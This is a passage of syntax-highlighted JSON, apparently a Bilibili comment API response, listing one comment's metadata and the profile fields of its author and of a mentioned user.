class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_folded&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rule&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dynamic_id_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;note_cvid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;track_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rpid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">270926184193</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">362747247</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">11</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">455215669</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rcount&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;state&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;fansgrade&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;attr&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ctime&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1754901514</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;oid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;362747247&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;rpid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;270926184193&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;root_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;parent_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;dialog_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;like&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Aidemofashi_&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;男&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aidemofashi_爱的魔法尸\nemail:zhonghuaiyu2019@163.com&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;face_nft_new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;official_verify&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;vip&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;vipType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipDueDate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;dueRemark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;accessStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;vipStatusWarn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;themeType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;label_theme&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;text_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;bg_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;border_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;use_img_label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hans_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/vip/d7b702ef65a976b20ed854cbd04cb9e27341bb79.png&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;img_label_uri_hant_static&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i0.hdslb.com/bfs/activity-plat/static/20220614/e369244d0b14644f5e1a06431e22a4d5/KJunwh19T5.png&quot;</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;avatar_subscript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;nickname_color&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fans_detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;user_sailing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;is_contractor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;contract_desc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;nft_interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;avatar_item&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;container_size&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1.8</span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;fallback_layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;layers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                                <span class="hljs-punctuation">&#123;</span><br>                                    <span class="hljs-attr">&quot;visible&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;layer_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;AVATAR_LAYER&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;is_critical&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;layer_mask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;general_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;pos_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;coordinate_pos&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_x&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;axis_y&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0.9</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;size_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;width&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;height&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;render_spec&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;opacity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                            <span class="hljs-attr">&quot;mask_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;draw&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;draw_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;fill_mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;color_config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                        <span class="hljs-attr">&quot;day&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                            <span class="hljs-attr">&quot;argb&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#FF000000&quot;</span><br>                                                        <span class="hljs-punctuation">&#125;</span><br>                                                    <span class="hljs-punctuation">&#125;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                                    <span class="hljs-attr">&quot;resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                        <span class="hljs-attr">&quot;res_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span><br>                                        <span class="hljs-attr">&quot;res_image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                            <span class="hljs-attr">&quot;image_src&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                <span class="hljs-attr">&quot;src_type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;placeholder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                                                <span class="hljs-attr">&quot;remote&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                                    <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/0bc090285a5b46c6b1652e35c18e3d54211e79ba.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                                                    <span class="hljs-attr">&quot;bfs_style&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;widget-layer-avatar&quot;</span><br>                                                <span class="hljs-punctuation">&#125;</span><br>                                            <span class="hljs-punctuation">&#125;</span><br>                                        <span class="hljs-punctuation">&#125;</span><br>                                    <span class="hljs-punctuation">&#125;</span><br>                                <span class="hljs-punctuation">&#125;</span><br>                            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_critical_group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>                        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;455215669&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;@PRTShark&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;at_name_to_mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;PRTShark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">122589358</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;at_name_to_mid_str&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;PRTShark&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;122589358&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;members&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                        <span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;mid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;122589358&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;uname&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;PRTShark&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;sex&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;保密&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;sign&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;唱着自己的歌，就不会忘记初衷&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;avatar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/d361e576cfb2250c697dcef03c978df3189a5a8a.jpg&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;rank&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;10000&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;face_nft_new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;is_senior_member&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;senior&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;level_info&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;current_level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;current_min&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;current_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;next_exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;pendant&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;expire&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image_enhance&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image_enhance_frame&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;n_pid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;nameplate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;nid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">10</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;见习偶像&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i2.hdslb.com/bfs/face/e93dd9edfa7b9e18bf46fd8d71862327a2350923.png&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;image_small&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://i1.hdslb.com/bfs/face/275b468b043ec246737ab8580a2075bee0b1263b.png&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;普通勋章&quot;</span><span class="hljs-punctuation">,</span><br>                                <span class="hljs-attr">&quot;condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;所有自制视频总播放数&gt;=10万&quot;</span><br>                            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>      